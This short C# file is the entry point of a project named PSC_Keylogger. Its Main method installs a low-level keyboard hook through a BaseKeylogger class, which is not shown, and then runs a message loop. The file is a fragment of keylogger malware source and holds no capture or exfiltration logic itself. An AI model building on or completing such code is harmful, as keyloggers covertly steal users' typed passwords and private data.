using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PSC_Keylogger
{
    static class Program
    {
        private static IntPtr hook;

        static void Main(string[] args)
        {
            hook = BaseKeylogger.SetHook(BaseKeylogger.llkProcedure);
            Application.Run();
        }

        
    }
}
